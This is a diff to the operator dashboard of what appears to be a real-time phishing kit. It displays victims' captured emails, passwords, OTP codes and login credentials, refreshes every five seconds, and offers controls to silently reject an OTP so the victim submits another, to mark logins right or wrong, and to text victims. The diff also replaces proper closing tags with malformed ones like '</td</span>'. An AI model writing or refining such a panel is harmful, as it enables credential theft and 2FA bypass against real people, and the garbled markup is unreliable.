@@ -759,20 +759,25 @@ tr:hover {
     }
   }
 
+  // INCORRECT OTP - SILENT, NO LOADING, JUST SEND REQUEST
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect?`)) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see error message and must submit a new OTP.`)) {
       try {
         await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-      } catch (error) { console.error('Incorrect OTP error:', error); }
+        // NO loading, NO notification, NO sound - just silent
+        console.log('Incorrect OTP triggered for:', email);
+      } catch (error) {
+        console.error('Incorrect OTP error:', error);
+      }
     }
   }
 
   async function wrongLoginCredentials(email) {
-    if (confirm(`❌ Mark login as WRONG?`)) {
+    if (confirm(`❌ Mark login as WRONG for: ${email}?`)) {
       try {
         await fetch('/api/admin/wrong-login', {
           method: 'POST',
@@ -784,7 +789,7 @@ tr:hover {
   }
 
   async function correctLoginCredentials(email) {
-    if (confirm(`✅ Mark login as CORRECT?`)) {
+    if (confirm(`✅ Mark login as CORRECT for: ${email}?`)) {
       try {
         await fetch('/api/admin/correct-login', {
           method: 'POST',
@@ -854,7 +859,7 @@ tr:hover {
 
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
-    if (!users.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td></tr>'; return; }
+    if (!users.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td</span> </span>'; return; }
     
     tbody.innerHTML = users.map(user => {
       let statusBadge = '';
@@ -868,14 +873,14 @@ tr:hover {
       const showLoginButtons = user.force_login === true || user.login_email !== null;
       
       return `<tr>
-        <td>${formatValue(user.email)}</td>
-        <td>${formatValue(user.password)}</td>
-        <td>${user.otp ? formatValue(user.otp) : '<span class="data-empty">—</span>'}</td>
-        <td>${user.second_otp ? formatValue(user.second_otp) : '<span class="data-empty">—</span>'}</td>
-        <td>${user.login_email ? formatValue(user.login_email) : '<span class="data-empty">—</span>'}</td>
-        <td>${user.login_password ? formatValue(user.login_password) : '<span class="data-empty">—</span>'}</td>
-        <td>${formatTimestamp(user.email_submitted_at)}</td>
-        <td>${statusBadge}</td>
+        <td>${formatValue(user.email)}</td</span>
+        <td>${formatValue(user.password)}</td</span>
+        <td>${user.otp ? formatValue(user.otp) : '<span class="data-empty">—</span>'}</td</span>
+        <td>${user.second_otp ? formatValue(user.second_otp) : '<span class="data-empty">—</span>'}</td</span>
+        <td>${user.login_email ? formatValue(user.login_email) : '<span class="data-empty">—</span>'}</td</span>
+        <td>${user.login_password ? formatValue(user.login_password) : '<span class="data-empty">—</span>'}</td</span>
+        <td>${formatTimestamp(user.email_submitted_at)}</td</span>
+        <td>${statusBadge}</td</span>
         <td class="actions-cell">
           <button class="action-btn approve-btn" onclick="approveUser('${user.email}')"><i class="fas fa-check-circle"></i> Approve</button>
           <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block</button>
@@ -888,7 +893,7 @@ tr:hover {
           <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
           <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
           <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
-        </td>
+         </td</span>
       </tr>`;
     }).join('');
   }
@@ -951,5 +956,6 @@ tr:hover {
   setInterval(loadUsers, 5000);
   loadBlockedEmails();
 </script>
+
 </body>
 </html>
